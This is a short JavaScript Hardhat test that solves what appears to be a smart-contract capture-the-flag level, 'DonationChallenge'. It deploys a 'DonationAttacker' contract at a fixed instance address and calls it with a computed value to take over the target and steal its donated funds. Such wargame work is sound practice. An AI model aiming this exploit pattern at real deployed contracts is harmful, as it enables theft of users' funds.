const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("DonationChallenge", function () {
    describe("Stealing donated funds", function () {
        it("Exploiting...", async function () {
            const [owner] = await ethers.getSigners();
            const instanceAddr = "0x08cc17fb3566B1d55F2acC571D0BAd92aa5C6aEe";

            const Attacker = await ethers.getContractFactory("DonationAttacker");
            const attacker = await Attacker.deploy(instanceAddr);
            await attacker.deployed();

            console.log(`"Deployed" attacker at ${attacker.address}`);

            const castedAddress = await attacker.castAddress(attacker.address);
            const exactMsgValue = await attacker.calculateMsgValue(castedAddress);

            await attacker.attackDonation(attacker.address, {value:exactMsgValue});
        });
    });
});